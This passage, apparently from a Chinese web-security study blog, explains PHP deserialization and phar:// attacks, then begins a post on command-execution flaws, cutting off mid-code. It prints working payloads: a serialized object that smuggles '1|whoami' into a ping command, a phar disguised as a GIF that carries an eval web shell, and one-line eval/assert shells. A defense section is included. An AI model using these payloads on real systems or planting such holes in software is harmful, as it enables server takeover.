class="keyword">echo</span> <span class="string">&quot;used set!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> Person(<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="variable">$person1</span>-&gt;sex=<span class="string">&#x27;male&#x27;</span>;</span><br><span class="line"><span class="comment">// 输出 used set!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h2><p>当尝试以调用函数的方式调用一个对象时自动触发（PHP 5.3以上）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span>,<span class="variable">$sex</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex=<span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;used invoke!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> Person(<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="variable">$person1</span>();</span><br><span class="line"><span class="comment">// 输出 used invoke!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="call"><a href="#call" class="headerlink" title="__call"></a>__call</h2><p>调用类中不存在的方法时会被执行</p><p>一般PHP中的call方法都是用来进行容错或者是动态调用</p><p>call一般会存在<code>call_user_func</code>和<code>call_user_func_array</code>，php代码执行的终点经常选择这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span>,<span class="variable">$sex</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex=<span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sercret</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;null&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$naem</span>,<span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;used call!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> Person(<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="variable">$person1</span>-&gt;sercret();</span><br><span class="line"><span class="comment">// 输出 used call!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="反序列化漏洞实例"><a href="#反序列化漏洞实例" class="headerlink" title="反序列化漏洞实例"></a>反序列化漏洞实例</h1><p><strong>利用漏洞思路：</strong></p><p>（1）一般反序列化漏洞都是通过代码审计而发现，一般的黑盒测试是很难发现的。</p><p>（2）假如我们通过代码审计发现了漏洞，我们要测试这个漏洞，那么我可以根据站点后台的逻辑进行payload的生成。</p><p>（3）我们将生成的payload（一串序列化的字符串）通过前台接口发送至后台，后台在创建、销毁对象的时候会执行魔法函数，完成预期攻击。</p><p><strong>实例</strong></p><p>demo.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method=<span class="variable">$method</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args=<span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 在对象被销毁时，会自动调用__destruct()方法</span></span><br><span class="line"><span class="comment">     * 此方法中会执行回调函数，即ping方法</span></span><br><span class="line"><span class="comment">     * 可以在实例化对象时将method设为ping，尝试命令执行</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// in_array() 函数搜索数组中是否存在指定的值，这里method如果是ping，则返回true</span></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method,<span class="keyword">array</span>(<span class="string">&quot;ping&quot;</span>)))&#123;</span><br><span class="line">            <span class="comment">// 调用回调函数，并把一个数组参数作为回调函数的参数</span></span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>,<span class="keyword">$this</span>-&gt;method),<span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * ping方法使用了system执行系统命令,为可利用点</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"><span class="variable">$host</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> system(<span class="string">&quot;ping -c 2 <span class="subst">$host</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$str</span>=str_replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;waf(<span class="keyword">$this</span>-&gt;args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">@unserialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method=<span class="variable">$method</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args=<span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> home(<span class="string">&#x27;ping&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;1|whoami&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);</span><br><span class="line"><span class="comment">// O:4:&quot;home&quot;:2:&#123;s:12:&quot;homemethod&quot;;s:4:&quot;ping&quot;;s:10:&quot;homeargs&quot;;a:1:&#123;i:0;s:8:&quot;1|whoami&quot;;&#125;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><p><code>a=O:4:&quot;home&quot;:2:&#123;s:12:&quot;%00home%00method&quot;;s:4:&quot;ping&quot;;s:10:&quot;%00home%00args&quot;;a:1:&#123;i:0;s:8:&quot;1|whoami&quot;;&#125;&#125;</code></p><blockquote><p>类中属性为private时，表示方式是在属性名前加上 %00类名%00</p><p>类中属性为protected时，表示方式是在属性名前加上 %00*%00</p></blockquote><p>提交payload，成功利用！</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210616002639723.png" alt="image-20210616002639723"></p><h1 id="利用phar-的反序列化"><a href="#利用phar-的反序列化" class="headerlink" title="利用phar://的反序列化"></a>利用phar://的反序列化</h1><blockquote><p>简单来说<code>phar</code>就是<code>php</code>压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与<code>file://</code> <code>php://</code>等类似，也是一种流包装器。</p></blockquote><p>Black Hat上，安全研究员<code>Sam Thomas</code>分享了议题<code>It’s a PHP unserialization vulnerability Jim, but not as we know it</code>，利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在<strong>文件系统函数</strong>（file_exists()、is_dir()等）参数可控的情况下，配合<strong>phar://伪协议</strong>，可以不依赖unserialize()直接进行反序列化操作。</p><p>摘自：<a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a></p><p><strong>phar文件结构</strong></p><ul><li><code>stub</code> phar 文件标识，格式为 <code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;；</code></li><li><code>manifest</code> 压缩文件的属性等信息，以<strong>序列化</strong>存储；</li><li><code>contents</code> 压缩文件的内容；</li><li><code>signature</code> 签名，放在文件末尾；</li></ul><p><strong>创建phar文件</strong></p><p>注意：要将php.ini中的<code>phar.readonly</code>选项设置为<code>Off</code>，否则无法生成phar文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> TestObject();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行后生成一个<code>phar.phar</code>，自定义的meta-data以序列化的形式存储</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210627215824342.png" alt="image-20210627215824342"></p><p>php一大部分的<a href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Destruct called&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>;</span><br><span class="line">    file_get_contents(<span class="variable">$filename</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210627221851355.png" alt="image-20210627221851355"></p><p><strong>demo</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">heello</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&#x27;echo &quot;heello!&quot;;&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;output);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_exists(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里虽然没有<code>unserialize()</code>执行反序列化，但可以结合<code>file_exists()</code>函数在通过<code>phar://</code>伪协议解析phar文件时，会将meta-data进行反序列化，进而触发<code>__destruct()</code>函数，利用<code>eval()</code>函数达到命令执行。</p><p>ps：可将phar伪造成其他格式的文件（添加任意的文件头+修改后缀名），绕过文件上传检测，上传“phar文件”到服务器进行利用。</p><p>使用如下代码生成phar文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">heello</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&#x27;@eval($_GET[1]);&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @unlink(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> heello();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将<code>test.phar</code>改为<code>test.gif</code>并上传，访问<code>?filename=phar://test.gif/test.txt&amp;1=phpinfo();</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210627231830253.png" alt="image-20210627231830253"></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ol><li><p>认证和签名</p><p>通过认证，来避免应用接受黑客的异常输入。对于点对点的服务，我们可以通过加入签名的方式来进行防护。比如，对存储的数据进行签名，以此对调用来源进行身份校验。只要黑客获取不到密钥信息，它就无法向进行反序列化的服务接口发送数据，也就无从发起反序列化攻击了。</p></li><li><p>限制序列化和反序列化的类</p><p>可以通过构建黑名单的方式，来检测反序列化过程中调用链的异常。</p></li><li><p>RASP检测</p><p>业内推出了 RASP（Runtime Application Self-Protection，实时程序自我保护）。RASP 通过 hook 等方式，在这些关键函数的调用中，增加一道规则的检测。这个规则会判断应用是否执行了非应用本身的逻辑，能够在不修改代码的情况下对反序列化漏洞攻击实现拦截。</p></li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a></p><p>[2] <a href="https://www.freebuf.com/column/198945.html">PHP反序列化入门之phar</a></p><p>[3] <a href="https://zhuanlan.zhihu.com/p/157910790">通过反序列化漏洞，黑客能做什么呢？</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> 反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行漏洞学习</title>
      <link href="posts/4134.html"/>
      <url>posts/4134.html</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><strong>产生原因：</strong></p><p>应用未对用户输入做严格的检查过滤，导致用户输入的参数被当成命令来执行。</p><p><strong>危害：</strong></p><ol><li>继承Web服务程序的权限去执行系统命令或读写文件</li><li>反弹shell，获得目标服务器的权限</li><li>进一步内网渗透</li></ol><h1 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h1><p>在PHP中，有时候需要调用一些执行命令的函数，如：<code>eval()</code>、<code>assert()</code>、<code>preg_replace()</code>、<code>create_function()</code>等，如果存在一个使用这些函数且未对可被用户控制的参数进行检查过滤的页面，那么这个页面就有可能存在远程命令执行漏洞。</p><h2 id="eval-和-assert-函数"><a href="#eval-和-assert-函数" class="headerlink" title="eval() 和 assert() 函数"></a>eval() 和 assert() 函数</h2><p>eval() 和 assert() 函数都可以执行参数内的代码，且接受的参数为字符串。</p><p>注意：eval() 函数传入的参数必须为PHP代码，即要以分号结尾，而assert() 函数不需要以分号结尾。</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210530161554120.png" alt="image-20210530161554120"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @assert(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210530161938256.png" alt="image-20210530161938256"></p><h2 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace 函数"></a>preg_replace 函数</h2><p>使用：preg_replace(‘正则规则’,’替换字符’,’目标字符’)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> preg_replace(<span class="string">&quot;/test/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>],<span class="string">&quot;just test&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210530164938087.png" alt="image-20210530164938087"></p><p>原理：PCRE修饰符e：preg_replace()在进行了对替换字符串的后向引用替换之后，将替换后的字符串作为php代码执行（eval函数方式），并使用执行结果作为实际参与替换的字符串。</p><blockquote><p>注意：php5.5后，/e修饰符已经被弃用！</p></blockquote><h2 id="array-map-函数"><a href="#array-map-函数" class="headerlink" title="array_map()函数"></a>array_map()函数</h2><p>将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。</p><p>例子(高版本的php可能不适用)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line"><span class="variable">$new_array</span>=array_map(<span class="variable">$func</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$new_array</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210530170647764.png" alt="image-20210530170647764"></p><p>类似函数：</p><ul><li>create_function()</li><li>call_user_func()</li><li>all_user_func_array()</li><li>array_filter()</li><li>uasort()</li></ul><h2 id="动态函数"><a href="#动态函数" class="headerlink" title="动态函数"></a>动态函数</h2><p>利用动态函数执行，PHP函数可直接由字符串拼接而成。</p><p>例子（高版本PHP不适用）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210530171952315.png" alt="image-20210530171952315"></p><h1 id="系统（本地）命令执行"><a href="#系统（本地）命令执行" class="headerlink" title="系统（本地）命令执行"></a>系统（本地）命令执行</h1><p>利用PHP 的系统命令执行函数来调用系统命令并执行，这类函数有<code>system()</code>、<code>exec()</code>、<code>shell exec()</code>、<code>passthru() </code>、<code>penti_exec() </code>、<code>popen() </code>、<code>proc_pen()</code>等，此外还有反引号命令执行，这种方式实际上是调用shell_exec()函数来执行。</p><ul><li>system()：执行外部程序﹐并且显示输出</li><li>exec()∶执行一个外部程序</li><li>shell_exec():通过 shell环境执行命令，并且将完整的输出以字符串的方式返回</li><li>passthru() :执行unix系统命令并且显示原始输出</li><li>pcntl_exec() :在当前进程空间执行指定程序</li><li>popen():打开进程文件指针</li><li>proc_open():执行一个命令，并且打开用来输入/输出的文件指针。</li></ul><p>反引号命令执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = `ls -al`;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span 